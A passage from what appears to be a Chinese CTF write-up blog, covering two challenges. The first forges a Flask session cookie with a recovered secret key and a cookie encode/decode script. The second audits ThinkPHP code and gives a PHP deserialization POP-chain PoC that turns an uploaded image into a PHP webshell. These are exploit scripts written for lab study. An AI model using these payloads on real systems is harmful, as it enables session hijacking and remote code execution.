class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> base64_decode<br><span class="hljs-keyword">import</span> ast<br><br><span class="hljs-comment"># Abstract Base Classes (PEP 3119)</span><br><span class="hljs-keyword">if</span> sys.version_info[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">3</span>: <span class="hljs-comment"># &lt; 3.0</span><br>    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Must be using at least Python 3&#x27;</span>)<br><span class="hljs-keyword">elif</span> sys.version_info[<span class="hljs-number">0</span>] == <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> sys.version_info[<span class="hljs-number">1</span>] &lt; <span class="hljs-number">4</span>: <span class="hljs-comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span><br>    <span class="hljs-keyword">from</span> abc <span class="hljs-keyword">import</span> ABCMeta, abstractmethod<br><span class="hljs-keyword">else</span>: <span class="hljs-comment"># &gt; 3.4</span><br>    <span class="hljs-keyword">from</span> abc <span class="hljs-keyword">import</span> ABC, abstractmethod<br><br><span class="hljs-comment"># Lib for argument parsing</span><br><span class="hljs-keyword">import</span> argparse<br><br><span class="hljs-comment"># external Imports</span><br><span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> SecureCookieSessionInterface<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MockApp</span>(<span class="hljs-title class_ inherited__">object</span>):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, secret_key</span>):<br>        <span class="hljs-variable language_">self</span>.secret_key = secret_key<br><br><br><span class="hljs-keyword">if</span> sys.version_info[<span class="hljs-number">0</span>] == <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> sys.version_info[<span class="hljs-number">1</span>] &lt; <span class="hljs-number">4</span>: <span class="hljs-comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">FSCM</span>(metaclass=ABCMeta):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">secret_key, session_cookie_structure</span>):<br>            <span class="hljs-string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span><br>            <span class="hljs-keyword">try</span>:<br>                app = MockApp(secret_key)<br><br>                session_cookie_structure = <span class="hljs-built_in">dict</span>(ast.literal_eval(session_cookie_structure))<br>                si = SecureCookieSessionInterface()<br>                s = si.get_signing_serializer(app)<br><br>                <span class="hljs-keyword">return</span> s.dumps(session_cookie_structure)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(e)<br>                <span class="hljs-keyword">raise</span> e<br><br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">session_cookie_value, secret_key=<span class="hljs-literal">None</span></span>):<br>            <span class="hljs-string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">if</span>(secret_key==<span class="hljs-literal">None</span>):<br>                    compressed = <span class="hljs-literal">False</span><br>                    payload = session_cookie_value<br><br>                    <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">&#x27;.&#x27;</span>):<br>                        compressed = <span class="hljs-literal">True</span><br>                        payload = payload[<span class="hljs-number">1</span>:]<br><br>                    data = payload.split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>]<br><br>                    data = base64_decode(data)<br>                    <span class="hljs-keyword">if</span> compressed:<br>                        data = zlib.decompress(data)<br><br>                    <span class="hljs-keyword">return</span> data<br>                <span class="hljs-keyword">else</span>:<br>                    app = MockApp(secret_key)<br><br>                    si = SecureCookieSessionInterface()<br>                    s = si.get_signing_serializer(app)<br><br>                    <span class="hljs-keyword">return</span> s.loads(session_cookie_value)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(e)<br>                <span class="hljs-keyword">raise</span> e<br><span class="hljs-keyword">else</span>: <span class="hljs-comment"># &gt; 3.4</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">FSCM</span>(<span class="hljs-title class_ inherited__">ABC</span>):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">secret_key, session_cookie_structure</span>):<br>            <span class="hljs-string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span><br>            <span class="hljs-keyword">try</span>:<br>                app = MockApp(secret_key)<br><br>                session_cookie_structure = <span class="hljs-built_in">dict</span>(ast.literal_eval(session_cookie_structure))<br>                si = SecureCookieSessionInterface()<br>                s = si.get_signing_serializer(app)<br><br>                <span class="hljs-keyword">return</span> s.dumps(session_cookie_structure)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(e)<br>                <span class="hljs-keyword">raise</span> e<br><br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">session_cookie_value, secret_key=<span class="hljs-literal">None</span></span>):<br>            <span class="hljs-string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">if</span>(secret_key==<span class="hljs-literal">None</span>):<br>                    compressed = <span class="hljs-literal">False</span><br>                    payload = session_cookie_value<br><br>                    <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">&#x27;.&#x27;</span>):<br>                        compressed = <span class="hljs-literal">True</span><br>                        payload = payload[<span class="hljs-number">1</span>:]<br><br>                    data = payload.split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>]<br><br>                    data = base64_decode(data)<br>                    <span class="hljs-keyword">if</span> compressed:<br>                        data = zlib.decompress(data)<br><br>                    <span class="hljs-keyword">return</span> data<br>                <span class="hljs-keyword">else</span>:<br>                    app = MockApp(secret_key)<br><br>                    si = SecureCookieSessionInterface()<br>                    s = si.get_signing_serializer(app)<br><br>                    <span class="hljs-keyword">return</span> s.loads(session_cookie_value)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(e)<br>                <span class="hljs-keyword">raise</span> e<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># Args are only relevant for __main__ usage</span><br>    <br>    <span class="hljs-comment">## Description for help</span><br>    parser = argparse.ArgumentParser(<br>                description=<span class="hljs-string">&#x27;Flask Session Cookie Decoder/Encoder&#x27;</span>,<br>                epilog=<span class="hljs-string">&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;</span>)<br><br>    <span class="hljs-comment">## prepare sub commands</span><br>    subparsers = parser.add_subparsers(<span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;sub-command help&#x27;</span>, dest=<span class="hljs-string">&#x27;subcommand&#x27;</span>)<br><br>    <span class="hljs-comment">## create the parser for the encode command</span><br>    parser_encode = subparsers.add_parser(<span class="hljs-string">&#x27;encode&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;encode&#x27;</span>)<br>    parser_encode.add_argument(<span class="hljs-string">&#x27;-s&#x27;</span>, <span class="hljs-string">&#x27;--secret-key&#x27;</span>, metavar=<span class="hljs-string">&#x27;&lt;string&gt;&#x27;</span>,<br>                                <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Secret key&#x27;</span>, required=<span class="hljs-literal">True</span>)<br>    parser_encode.add_argument(<span class="hljs-string">&#x27;-t&#x27;</span>, <span class="hljs-string">&#x27;--cookie-structure&#x27;</span>, metavar=<span class="hljs-string">&#x27;&lt;string&gt;&#x27;</span>,<br>                                <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Session cookie structure&#x27;</span>, required=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-comment">## create the parser for the decode command</span><br>    parser_decode = subparsers.add_parser(<span class="hljs-string">&#x27;decode&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;decode&#x27;</span>)<br>    parser_decode.add_argument(<span class="hljs-string">&#x27;-s&#x27;</span>, <span class="hljs-string">&#x27;--secret-key&#x27;</span>, metavar=<span class="hljs-string">&#x27;&lt;string&gt;&#x27;</span>,<br>                                <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Secret key&#x27;</span>, required=<span class="hljs-literal">False</span>)<br>    parser_decode.add_argument(<span class="hljs-string">&#x27;-c&#x27;</span>, <span class="hljs-string">&#x27;--cookie-value&#x27;</span>, metavar=<span class="hljs-string">&#x27;&lt;string&gt;&#x27;</span>,<br>                                <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Session cookie value&#x27;</span>, required=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-comment">## get args</span><br>    args = parser.parse_args()<br><br>    <span class="hljs-comment">## find the option chosen</span><br>    <span class="hljs-keyword">if</span>(args.subcommand == <span class="hljs-string">&#x27;encode&#x27;</span>):<br>        <span class="hljs-keyword">if</span>(args.secret_key <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> args.cookie_structure <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>):<br>            <span class="hljs-built_in">print</span>(FSCM.encode(args.secret_key, args.cookie_structure))<br>    <span class="hljs-keyword">elif</span>(args.subcommand == <span class="hljs-string">&#x27;decode&#x27;</span>):<br>        <span class="hljs-keyword">if</span>(args.secret_key <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> args.cookie_value <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>):<br>            <span class="hljs-built_in">print</span>(FSCM.decode(args.cookie_value,args.secret_key))<br>        <span class="hljs-keyword">elif</span>(args.cookie_value <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>):<br>            <span class="hljs-built_in">print</span>(FSCM.decode(args.cookie_value))<br></code></pre></td></tr></table></figure><p>user session：</p><p><img src="/../image/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4-7.png"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">eyJ<span class="hljs-number">1</span>c<span class="hljs-number">2</span>VybmFtZSI<span class="hljs-number">6</span>eyIgYiI<span class="hljs-number">6</span>ImQzZD<span class="hljs-symbol">NMV1</span>JoZEdFPSJ<span class="hljs-number">9</span>fQ.aBesfw.B<span class="hljs-symbol">nyv1</span>q<span class="hljs-number">4</span>-p<span class="hljs-number">7</span>MwmbKZpd<span class="hljs-number">3</span>bqsikH<span class="hljs-meta">o4</span><br></code></pre></td></tr></table></figure><p>先用脚本解密</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pytho<span class="hljs-symbol">n3</span> flask_sessio<span class="hljs-symbol">n_cookie_manager3</span>.py decode -c <span class="hljs-string">&quot;eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.aBesfw.Bnyv1q4-p7MwmbKZpd3bqsikHo4&quot;</span> -s <span class="hljs-string">&quot;187.265372344&quot;</span> <br><br>输出：<br>&#123;<span class="hljs-string">&#x27;username&#x27;</span>: b<span class="hljs-string">&#x27;www-data&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>将<code>&#123;&#39;username&#39;: b&#39;www-data&#39;&#125;</code>修改为<code>&#123;&#39;username&#39;: b&#39;fuck&#39;&#125;</code>然后重新加密生成session</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python3 flask_session_cookie_manager3<span class="hljs-selector-class">.py</span> encode -s <span class="hljs-string">&quot;187.265372344&quot;</span> -t <span class="hljs-string">&quot;&#123;&#x27;username&#x27;: b&#x27;fuck&#x27;&#125;&quot;</span><br><br>输出：<br>eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19<span class="hljs-selector-class">.aBexnA</span>.HoH-q2eUlMfL0St0IImanIE-_mM<br></code></pre></td></tr></table></figure><p>将伪造的session替换原来的session，然后再访问&#x2F;flag即可拿到flag。</p><p><img src="/../image/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4-8.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> Flask源码读取 </tag>
            
            <tag> uuid.getnode()/Mac地址读取 </tag>
            
            <tag> 预测随机种子 </tag>
            
            <tag> session密钥解密 </tag>
            
            <tag> 管理员session伪造 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网杯2019-Upload</title>
      <link href="/2025/04/30/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-Upload/"/>
      <url>/2025/04/30/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-Upload/</url>
      
        <content type="html"><![CDATA[<h1 id="强网杯2019-Upload"><a href="#强网杯2019-Upload" class="headerlink" title="强网杯2019-Upload"></a>强网杯2019-Upload</h1><p>参考链接：<a href="https://kinsey973.github.io/2024/08/18/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-Upload/">https://kinsey973.github.io/2024/08/18/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-Upload/</a></p><p>首先打开页面发现是一个登录注册页面，随便注册一个账号登录。</p><p><img src="/../image/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-Upload-1.png"></p><p>登录之后进到了一个文件上传页面，尝试上传一句话木马。先上传一个ptmuma.jpg文件。但是传完之后发现我们上传的文件的后缀名被改成了png，且可以看到路径和文件名都进行了重命名使用md5值。</p><p><img src="/../image/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-Upload-2.png"></p><p>进行目录扫描，扫出来一个<a href="http://www.tar.gz在根目录,下载下来发现是thinkphp5框架/">www.tar.gz在根目录，下载下来发现是thinkphp5框架</a></p><p>我们在controller文件夹中发现几个php文件。</p><p>由于代码太多，只看重点。</p><p>Index.php</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Index</span> <span class="hljs-title">extends</span> <span class="hljs-title">Controller</span><br>&#123;<br>    <span class="hljs-keyword">public</span> function login_check()&#123;<br>        $profile=cookie(<span class="hljs-string">&#x27;user&#x27;</span>);<br>        <span class="hljs-keyword">if</span>(!empty($profile))&#123;<br>            $<span class="hljs-keyword">this</span>-&gt;profile=unserialize(base64_decode($profile));<br>            $<span class="hljs-keyword">this</span>-&gt;profile_db=db(<span class="hljs-string">&#x27;user&#x27;</span>)-&gt;<span class="hljs-keyword">where</span>(<span class="hljs-string">&quot;ID&quot;</span>,intval($<span class="hljs-keyword">this</span>-&gt;profile[<span class="hljs-string">&#x27;ID&#x27;</span>]))-&gt;find();<br>            <span class="hljs-keyword">if</span>(array_diff($<span class="hljs-keyword">this</span>-&gt;profile_db,$<span class="hljs-keyword">this</span>-&gt;profile)==<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里有存在一个反序列化点，并且反序列化的字符串是通过Cookie来传值的，是可控的。所以我们可以通过Cookie传值user&#x3D;xxx来触发反序列化漏洞。</p><hr><p>Profile.php</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs awk">class Profile extends Controller<br>&#123;<br>    public <span class="hljs-keyword">function</span> upload_img()&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$this</span>-&gt;checker)&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$this</span>-&gt;checker-&gt;login_check())&#123;<br>                <span class="hljs-variable">$curr_url</span>=<span class="hljs-string">&quot;http://&quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="hljs-string">&quot;/index&quot;</span>;<br>                <span class="hljs-variable">$this</span>-&gt;redirect(<span class="hljs-variable">$curr_url</span>,<span class="hljs-number">302</span>);<br>                <span class="hljs-keyword">exit</span>();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!empty(<span class="hljs-variable">$_FILES</span>))&#123;<br>            <span class="hljs-variable">$this</span>-&gt;filename_tmp=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$this</span>-&gt;filename=md5(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]).<span class="hljs-string">&quot;.png&quot;</span>;<br>            <span class="hljs-variable">$this</span>-&gt;ext_check();<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$this</span>-&gt;ext) &#123;<br>            <span class="hljs-keyword">if</span>(getimagesize(<span class="hljs-variable">$this</span>-&gt;filename_tmp)) &#123;<br>                @copy(<span class="hljs-variable">$this</span>-&gt;filename_tmp, <span class="hljs-variable">$this</span>-&gt;filename);<br>                @unlink(<span class="hljs-variable">$this</span>-&gt;filename_tmp);<br>                <span class="hljs-variable">$this</span>-&gt;img=<span class="hljs-string">&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;</span>;<br>                <span class="hljs-variable">$this</span>-&gt;update_img();<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$this</span>-&gt;error(<span class="hljs-string">&#x27;Forbidden type!&#x27;</span>, url(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$this</span>-&gt;error(<span class="hljs-string">&#x27;Unknow file type!&#x27;</span>, url(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在upload_image方法中的第三个if判断语句中有一个copy函数，将临时的文件复制成一个新文件，然后再将临时文件删除。而临时文件的文件名和新文件名都是类中的成员属性，所以我们如果能够触发反序列化漏洞可以自己修改临时文件名和文件名，将png文件改为php文件，这样就能getshell了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;except[<span class="hljs-variable">$name</span>];<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;)&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;&#125;(<span class="hljs-variable">$arguments</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>同样在Profile.php的class Profile中存在两个魔术方法，分别是__get和__call，这两个魔术方法一个是在调用对象中不存在的成员变量时触发，一个在调用对象中不存在的成员方法时触发。</p><hr><p>Register.php</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Register</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br>&#123;<br>public function __destruct()<br>    &#123;<br>        <span class="hljs-keyword">if</span>(!$<span class="hljs-keyword">this</span>-&gt;registed)&#123;<br>            $<span class="hljs-keyword">this</span>-&gt;checker-&gt;index();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里存在析构函数__destruct，能在反序列化时触发。当成员属性registed为false时，就会执行$this-&gt;checker-&gt;index();</p><hr><p><strong>分析</strong></p><p>可以通过Register.php中的析构函数destruct，只要将registed赋值为false，再将Register类中的成员属性checker赋值为一个Profile类的对象，等于去调用不存在的成员方法Index，就能触发call魔术方法。然后if($this-&gt;{$name})会调用不存在的成员变量Index，从而触发get魔术方法，get魔术方法会返回$this-&gt;except[$name];，然后就会去执行$this-&gt;{$this-&gt;{$name}}($arguments);，我们只需要将get里的返回值$this-&gt;except[$name]的值改为img，然后将img的值改为upload_image就能在call里对upload_image方法进行调用。然后成功getshell。所以需要先改except &#x3D; [‘index’ &#x3D;&gt; ‘img’];然后再改img &#x3D; “upload_img”;</p><p>通过上面的审计，可以将反序列化pop链写出来</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">Register</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:__destruct-&gt;Profile</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:__call-&gt;Profile</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:__get--&gt;Profile</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:img_upload</span><br></code></pre></td></tr></table></figure><p>构造poc。</p><p><strong>poc：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">web</span>\<span class="hljs-title class_">controller</span>;<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Profile</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$checker</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename_tmp</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$upload_menu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ext</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$img</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$except</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;except[<span class="hljs-variable">$name</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;&#125;(<span class="hljs-variable">$arguments</span>);<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Register</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$checker</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$registed</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable language_">$this</span>-&gt;registed)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;checker-&gt;<span class="hljs-title function_ invoke__">index</span>();<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-variable">$profile</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Profile</span>();<br><span class="hljs-variable">$profile</span>-&gt;except = [<span class="hljs-string">&#x27;index&#x27;</span> =&gt; <span class="hljs-string">&#x27;img&#x27;</span>];<br><span class="hljs-variable">$profile</span>-&gt;img = <span class="hljs-string">&quot;upload_img&quot;</span>;<br><span class="hljs-variable">$profile</span>-&gt;ext = <span class="hljs-string">&quot;png&quot;</span>;<br><span class="hljs-variable">$profile</span>-&gt;filename_tmp = <span class="hljs-string">&quot;./upload/76d9f00467e5ee6abc3ca60892ef304e/1905e3297318e07f689eeda3afb79dc7.png&quot;</span>;<br><span class="hljs-variable">$profile</span>-&gt;filename = <span class="hljs-string">&quot;./upload/76d9f00467e5ee6abc3ca60892ef304e/1905e3297318e07f689eeda3afb79dc7.php&quot;</span>;<br><br><span class="hljs-variable">$register</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Register</span>();<br><span class="hljs-variable">$register</span>-&gt;registed = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$register</span>-&gt;checker = <span class="hljs-variable">$profile</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$register</span>)));<br></code></pre></td></tr></table></figure><p>注意：这里的路径要按上传后的文件的路径来改。不是固定的</p><p>payload：</p><figure class="highlight 